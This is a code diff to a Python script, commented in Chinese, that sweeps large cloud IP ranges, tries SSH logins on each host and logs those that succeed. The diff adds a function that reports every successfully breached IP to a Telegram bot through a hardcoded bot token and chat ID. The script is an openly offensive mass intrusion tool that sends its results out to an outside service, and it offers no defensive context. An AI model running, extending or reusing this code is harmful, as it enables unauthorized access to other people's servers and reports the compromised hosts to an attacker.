@@ -45,9 +45,29 @@ def try_ssh_login(ip):
     finally:
         ssh.close()
 
+# 发信息给TG机器人
+def send_message_to_telegram(message):
+    # 机器人令牌和聊天 ID，作为函数内部变量
+    bot_token = "8153892091:AAE97Mg3YjSuz_sFUUbVaqzLMSUe6X0YMWk"
+    chat_id = "6260718977"
+    
+    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
+    params = {
+        "chat_id": chat_id,
+        "text": message
+    }
+    response = requests.get(url, params=params)
+    
+    if response.status_code == 200:
+        print("Message sent successfully!")
+    else:
+        print(f"Failed to send message. Status code: {response.status_code}")
+        print(response.json())
+
+
 def main():
     ip_ranges = [
-        ('3.6.0.0', '3.255.255.255'),
+        ('3.7.1.1', '3.255.255.255'),
         ('18.96.0.0', '18.237.255.255'),
         ('54.150.0.0', '54.255.255.255')
     ]
@@ -64,6 +84,7 @@ def main():
                     # 2. 如果端口开放，尝试SSH登录
                     if try_ssh_login(ip):
                         print(f"成功登录到 {ip}")
+                        send_message_to_telegram(ip)
                         f.write(f"{ip}\n")
                     else:
                         print(f"登录失败: {ip}")
